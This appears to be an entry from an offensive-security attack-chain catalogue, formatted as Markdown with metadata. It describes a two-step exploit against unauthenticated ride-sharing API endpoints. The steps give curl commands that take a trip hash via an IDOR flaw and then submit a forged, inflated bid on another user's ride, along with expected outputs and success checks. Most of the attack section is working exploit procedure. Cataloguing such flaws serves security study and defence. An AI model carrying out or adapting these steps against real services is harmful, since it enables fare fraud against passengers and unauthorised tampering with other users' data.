---
tags:
  - idor
  - business-logic
  - api
  - unauthenticated
  - web
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-get-trip-config]]'
  - '[[commands/curl-put-forged-bid]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Generate-Trip-Hash-via-Unauthenticated-Config-Endpoint]]'
  - '[[procedures/Submit-Forged-Bid-to-Inflate-Fare-via-Bidding-Endpoint]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:34.954Z'
description: >-
  A multi-step attack exploiting Insecure Direct Object Reference (IDOR) and
  business logic flaws in unauthenticated API endpoints to generate a trip hash
  and submit a forged higher bid, inflating another user's ride fare.
skill_level: intermediate
impact_level: high
id: f4c7b310-3d66-4921-a727-eba70bff7093
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# IDOR and Business Logic Flaw to Inflate Ride Fares via Unauthenticated API Endpoints

Multi-stage attack chain demonstrating a complete attack workflow exploiting unauthenticated API endpoints in a ride-sharing platform to manipulate another user's trip fare.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Generate Trip Hash] --> B[Submit Forged Bid]
    B --> C[Inflated Fare Displayed]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- Web-based API (ride-sharing platform)
- Unauthenticated access to /v1/config and /v1/bidding endpoints
- Knowledge of target trip_id

### Initial Access Requirements

- No credentials required (unauthenticated endpoints)
- Network access to the API server
- No prior access needed

## Detailed Attack Procedures

### Step 1: Generate Trip Hash
procedure: [[procedures/Generate-Trip-Hash-via-Unauthenticated-Config-Endpoint]]

**Objective**: Obtain a hash for the target trip without authentication to enable subsequent manipulation.

**Instructions**: Identify a target trip_id (e.g., from public sources or enumeration). Use [[commands/curl-get-trip-config]] to fetch the config and extract the hash:

```bash
curl -X GET "https://api.example.com/v1/config?trip_id=TARGET_TRIP_ID" -H "Accept: application/json"
```

Replace TARGET_TRIP_ID with the actual ID (e.g., 12345). Parse the JSON response to retrieve the generated hash.

**Expected Output**: JSON response containing the trip configuration, including a hash value (e.g., {"hash": "abc123def"}).

**Success Indicators**:
- HTTP 200 response
- Valid hash extracted from response

### Step 2: Submit Forged Bid
procedure: [[procedures/Submit-Forged-Bid-to-Inflate-Fare-via-Bidding-Endpoint]]

**Objective**: Use the obtained hash to submit an inflated bid, impersonating the passenger and altering the ride fare.

**Instructions**: With the hash from Step 1, craft a PUT request using [[commands/curl-put-forged-bid]] to submit a higher bid amount:

```bash
curl -X PUT "https://api.example.com/v1/bidding" -H "Content-Type: application/json" -d '{"hash": "EXTRACTED_HASH", "bid_amount": 500}' -H "Accept: application/json"
```

Replace EXTRACTED_HASH with the value from Step 1 and set bid_amount to a higher value (e.g., 500 for inflated fare). This updates the trip bidding logic.

**Expected Output**: HTTP 200 or success response confirming bid submission (e.g., {"status": "bid_updated"}). Verify by checking the driver's interface for the inflated fare.

**Success Indicators**:
- Bid accepted without authentication
- Inflated fare appears on driver's screen
- Original passenger can still cancel the ride

## Attack Chain Summary

### Key Achievements

1. Bypassed authorization to access and manipulate trip data of other users
2. Chained unauthenticated endpoints to forge bids and inflate fares
3. Demonstrated potential for user conflicts and trust erosion in the platform

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
